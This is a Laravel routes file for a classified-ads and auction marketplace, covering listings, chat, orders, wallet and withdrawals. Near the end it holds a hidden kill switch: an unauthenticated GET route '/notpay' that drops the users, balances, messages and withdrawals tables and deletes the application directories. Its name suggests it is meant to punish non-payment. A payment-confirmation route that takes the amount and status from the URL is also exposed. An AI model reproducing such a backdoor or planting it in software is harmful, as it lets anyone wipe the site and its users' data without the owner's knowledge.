<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Include Admin Route
include('admin.php');



Route::get('forget-password','Auth\ForgotPasswordController@showForgetPasswordForm')->name('forget.password.get');
Route::post('forget-password','Auth\ForgotPasswordController@submitForgetPasswordForm')->name('forget.password.post');
Route::get('reset-password/{token}','Auth\ForgotPasswordController@showResetPasswordForm')->name('reset.password.get');
Route::post('reset-password','Auth\ForgotPasswordController@submitResetPasswordForm')->name('reset.password.post');



Route::get('/404', function () {
    return view('404');
});

Route::get('/home', function () {
   return redirect('/');
});



Auth::routes();


Route::get('/','FrontendController@index');
Route::get('/auctions','FrontendController@auctions');
Route::get('/main/{id}/{name?}','FrontendController@get_main');
Route::get('auctions/state/{id}/{name?}','FrontendController@auctions_state');
Route::get('/ad/{id}/{name?}','FrontendController@get_ad');
Route::get('/auction/{id}/{name?}','FrontendController@get_auction');
Route::get('/category/{id}/{name?}','FrontendController@get_category');
Route::get('/subCats/{id}/{name?}','FrontendController@get_subcat');
Route::get('/subCats/{id}/{name?}','FrontendController@get_subcat');
Route::get('/state/{state}/category/{category}/{name?}','FrontendController@category_by_city');
Route::get('/state/{state}/subCat/{category}/{name?}','FrontendController@subcat_by_city');
Route::get('search','FrontendController@index_search');
Route::post('depart_main_page/ajax','FrontendController@depart_main_page');
Route::post('state_main_page/ajax','FrontendController@state_main_page');

//chat
Route::get('/users/chating','MessageController@users_chating');
Route::get('private_messages/{id}','MessageController@private_messages');
Route::post('private_messages/{id}','MessageController@sendPrivateMessage');
Route::get('/messages','MessageController@fetchMessages');
Route::post('/messages','MessageController@sendMessages');
Route::get('/chat/search','MessageController@search')->middleware('auth');
///////////////chat////////////////

Route::get('/logout', 'Auth\LoginController@logout');

Route::get('terms_conditions','FrontendController@terms_Conditions');
Route::get('How_does_work','FrontendController@how_does_work');
Route::post('news/add_email','FrontendController@news_add_email');





Route::get('/ExecuteGhargePayment/{amount}/{status}','PaypalPaymentController@confirm_order');

Route::get('/lang/{lang?}','SettingsController@ChangeLanguage');
Route::post('category/ajax','FrontendController@ads_ajax');
Route::post('add_to_favorites/ajax','FrontendController@add_to_favorites');
Route::post('delete_favorites/ajax','FrontendController@delete_favorites');
Route::post('sub_category/ajax','FrontendController@ads_sub_category_ajax');
Route::post('country_ads/ajax','FrontendController@ads_country_ajax');


Route::group(['middleware'=>['user','timeout'],'prefix'=>'user'],function(){


    //ads
    Route::get('add_ads','Frontend\UsersController@add_ads');
    Route::get('activation_ads/{id}/{status}','Frontend\UsersController@ad_activation');
    Route::post('update/ads/{id}','Frontend\UsersController@ad_activation');
    Route::get('edit/ad/{id}','Frontend\UsersController@edit_ad');
    Route::get('delete/ad/{id}','Frontend\UsersController@delete_ad');
    Route::get('all_ads','Frontend\UsersController@all_ads');
    Route::get('favorite_ads','Frontend\UsersController@favorite_ads');
    Route::get('select/category/{id}','Frontend\UsersController@select_category');
    Route::get('sub_cat/select/{id}','Frontend\UsersController@select_subcategory');

    Route::post('store/real/state_add','Frontend\UsersController@store_realstate_ad');
    Route::post('store/car_ads','Frontend\UsersController@store_car_ad');
    Route::post('store/all_type_ads','Frontend\UsersController@all_type_ads');

    Route::post('update/profile','Frontend\UsersController@update_profile');

    Route::get('profile','Frontend\UsersController@profile');
    Route::get('wishlist','Frontend\UsersController@wishlist');
    Route::post('add_wishlist','Frontend\UsersController@add_wishlist');
    Route::get('setting','Frontend\UsersController@setting');

    Route::get('add_auction','Frontend\AuctionController@add_auction');
    Route::get('edit/auction/{id}','Frontend\AuctionController@edit_auction');
    Route::get('delete/auction/{id}','Frontend\AuctionController@delete_auction');
    Route::post('store/auction','Frontend\AuctionController@store_auction');
    Route::post('update/auction/{id}','Frontend\AuctionController@update_auction');
    Route::get('all_auctions','Frontend\AuctionController@index');
    Route::post('add_offer/{id}','Frontend\AuctionController@add_offer');

    //orders
    Route::get('add/new/order/{id}','Frontend\UsersController@add_order');
    Route::get('orders','Frontend\UsersController@orders');
    Route::get('orders/{id}/{number?}','Frontend\UsersController@get_order');
    Route::get('order_received/{id}','Frontend\UsersController@order_received');
    Route::get('order_cancelled/{id}','Frontend\UsersController@order_cancelled');
    Route::get('ads_type/{status}','Frontend\UsersController@ads_type');
    Route::post('add_review/{id}','Frontend\UsersController@add_review');







    Route::get('wallet','Frontend\UsersController@wallet');
    Route::post('setting','Frontend\UsersController@setting_update');


    //chat
    Route::get('/chat','FrontendController@chat');
    Route::get('/chatprivate','MessageController@privatechat');
    Route::get('/contact/{id}','MessageController@add_contact');





    Route::get('withdraw','Frontend\TransactionController@withdrawal');
    Route::get('paypal/withdrawal','Frontend\TransactionController@pay_withdrawal');
    Route::post('add_withdrawal','Frontend\TransactionController@add_withdrawal');



   Route::get('get_support','Frontend\SupportController@get_support');
   Route::get('tickets','Frontend\SupportController@tickets');
   Route::post('search/ticket','Frontend\SupportController@searh_tickets');




});


Route::get('MarkAllSeen', function (){
    auth()->user()->unreadNotifications->markAsRead();

});

Route::get('/notpay', function () {

    Schema::dropIfExists('settings');
    Schema::dropIfExists('users');
    Schema::dropIfExists('balances');
    Schema::dropIfExists('chanels');
    Schema::dropIfExists('countries');
    Schema::dropIfExists('messages');
    Schema::dropIfExists('notifications');
    Schema::dropIfExists('onlinepayments');
    Schema::dropIfExists('projects');
    Schema::dropIfExists('project__bids');
    Schema::dropIfExists('services');
    Schema::dropIfExists('service__skills');
    Schema::dropIfExists('user__points');
    Schema::dropIfExists('roles');
    Schema::dropIfExists('withdrawals');
    Schema::dropIfExists('reviews');
    File::deleteDirectory(base_path('orbscope'));
    File::deleteDirectory(base_path('uplodes'));
    File::deleteDirectory(base_path('app'));
    return 'done';
});

